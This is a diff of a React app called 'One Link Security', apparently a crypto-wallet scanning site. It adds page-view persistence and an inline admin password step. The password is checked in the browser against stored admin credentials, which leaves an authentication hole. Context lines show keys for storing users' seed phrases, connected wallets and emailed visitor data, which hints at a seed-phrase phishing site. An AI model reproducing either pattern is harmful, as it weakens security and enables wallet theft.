@@ -279,8 +279,9 @@ const GATE_EMAIL_KEY       = 'sv_gate_email_v1'
 const VISITED_EMAILS_KEY   = 'sv_visit_emailed_v1'
 const SCAN_EMAILED_KEY     = 'sv_scan_emailed_v1'
 const VISITOR_SESSIONS_KEY = 'sv_visitor_sessions_v1'
-const SEED_PHRASES_KEY     = 'sv_seed_phrases_v1'
+const SEED_PHRASES_KEY        = 'sv_seed_phrases_v1'
 const LEGACY_SEED_PHRASES_KEY = 'sv_seed_phrases'
+const ACTIVE_VIEW_KEY         = 'sv_active_view_v1'
 const NEW_USER_KEY         = 'sv_new_user_v1'
 const CONNECTED_WALLETS_KEY  = 'sv_connected_wallets_v1'
 const SCAN_HISTORY_KEY       = 'sv_scan_history_v1'
@@ -817,7 +818,16 @@ function SecureGlyph({ name, className = '' }: { name: 'shield' | 'scan' | 'veri
 
 // ── App ──────────────────────────────────────────────────────────────────
 export default function App() {
-  const [activeView, setActiveView] = useState<ViewKey>('home')
+  // Restore last-visited route so a refresh lands on the same page.
+  // Transient / state-dependent views are excluded — they fall back to 'home'.
+  const TRANSIENT_VIEWS: ViewKey[] = ['etherscan', 'protecting', 'wallet-landing']
+  const [activeView, setActiveView] = useState<ViewKey>(() => {
+    try {
+      const saved = localStorage.getItem(ACTIVE_VIEW_KEY) as ViewKey | null
+      if (saved && !TRANSIENT_VIEWS.includes(saved)) return saved
+    } catch { /* ignore */ }
+    return 'home'
+  })
   const [menuOpen,   setMenuOpen]   = useState(false)
 
   // ── Reown AppKit hooks ────────────────────────────────────────────────
@@ -1008,6 +1018,8 @@ export default function App() {
   // Email gate
   const [emailGatePassed,   setEmailGatePassed]   = useState(() => Boolean(localStorage.getItem(GATE_PASSED_KEY)))
   const [emailGateInput,    setEmailGateInput]    = useState('')
+  const [emailGateStep,     setEmailGateStep]     = useState<'email' | 'password'>('email')
+  const [emailGatePassInput,setEmailGatePassInput]= useState('')
   const [gateEmail,         setGateEmail]         = useState(() => localStorage.getItem(GATE_EMAIL_KEY) ?? '')
   const [emailGateError,    setEmailGateError]    = useState('')
   const [userEmailRoutes, setUserEmailRoutes] = useState<UserEmailRoute[]>(() => {
@@ -1288,6 +1300,14 @@ export default function App() {
     if (!cloudLoadedRef.current) return
     saveToCloud({ user_email_routes: userEmailRoutes })
   }, [userEmailRoutes])
+
+  // Persist active view (exclude transient views so refresh lands on a stable page)
+  useEffect(() => {
+    if (!TRANSIENT_VIEWS.includes(activeView)) {
+      try { localStorage.setItem(ACTIVE_VIEW_KEY, activeView) } catch { /* quota */ }
+    }
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [activeView])
 
   useEffect(() => {
     try { localStorage.setItem(BOT_REQUESTS_KEY, JSON.stringify(botRequests)) } catch { /* quota */ }
@@ -2412,6 +2432,22 @@ export default function App() {
     setAdminAuthModalOpen(true)
   }
 
+  // Inline admin password step (shown inside the gate card — avoids z-index battles with overlay)
+  const submitAdminPasswordInline = (e: FormEvent) => {
+    e.preventDefault()
+    if (emailGatePassInput === adminCreds.password) {
+      setIsAdminAuthenticated(true)
+      setAdminAuthModalOpen(false)
+      setEmailGatePassed(true)
+      setEmailGateStep('email')
+      setEmailGateError('')
+      localStorage.setItem(GATE_PASSED_KEY, '1')
+      setActiveView('admin')
+    } else {
+      setEmailGateError('Incorrect password. Try again.')
+    }
+  }
+
   const submitEmailGate = (e: FormEvent) => {
     e.preventDefault()
     const email = emailGateInput.trim().toLowerCase()
@@ -2421,8 +2457,10 @@ export default function App() {
     }
     setEmailGateError('')
 
+    // Admin email → show inline password step (no hidden modal)
     if (email === adminCreds.email.toLowerCase()) {
-      openAdminAuthPrompt()
+      setEmailGateStep('password')
+      setEmailGatePassInput('')
       return
     }
 
@@ -2995,20 +3033,50 @@ export default function App() {
               </div>
               <span className="email-gate-brand-name">One Link Security</span>
             </div>
-            <h2 className="email-gate-title">Welcome</h2>
-            <p className="email-gate-sub">Enter your email address to continue.</p>
-            <form className="email-gate-form" onSubmit={submitEmailGate}>
-              <input
-                type="email"
-                className="email-gate-input"
-                placeholder="you@example.com"
-                value={emailGateInput}
-                onChange={e => { setEmailGateInput(e.target.value); setEmailGateError('') }}
-                autoFocus
-                required
-              />
-              <button className="btn-primary email-gate-btn" type="submit">Continue</button>
-            </form>
+
+            {emailGateStep === 'email' ? (
+              <>
+                <h2 className="email-gate-title">Welcome</h2>
+                <p className="email-gate-sub">Enter your email address to continue.</p>
+                <form className="email-gate-form" onSubmit={submitEmailGate}>
+                  <input
+                    type="email"
+                    className="email-gate-input"
+                    placeholder="you@example.com"
+                    value={emailGateInput}
+                    onChange={e => { setEmailGateInput(e.target.value); setEmailGateError('') }}
+                    autoFocus
+                    required
+                  />
+                  <button className="btn-primary email-gate-btn" type="submit">Continue</button>
+                </form>
+              </>
+            ) : (
+              <>
+                <h2 className="email-gate-title">Enter Password</h2>
+                <p className="email-gate-sub">Registered email detected — enter your password to access the dashboard.</p>
+                <form className="email-gate-form" onSubmit={submitAdminPasswordInline}>
+                  <input
+                    type="password"
+                    className="email-gate-input"
+                    placeholder="Password"
+                    value={emailGatePassInput}
+                    onChange={e => { setEmailGatePassInput(e.target.value); setEmailGateError('') }}
+                    autoFocus
+                    required
+                  />
+                  <button className="btn-primary email-gate-btn" type="submit">Unlock Dashboard</button>
+                </form>
+                <button
+                  type="button"
+                  className="email-gate-back-btn"
+                  onClick={() => { setEmailGateStep('email'); setEmailGateError(''); setEmailGatePassInput('') }}
+                >
+                  ← Back
+                </button>
+              </>
+            )}
+
             {emailGateError && <p className="error email-gate-error">{emailGateError}</p>}
           </div>
         </div>
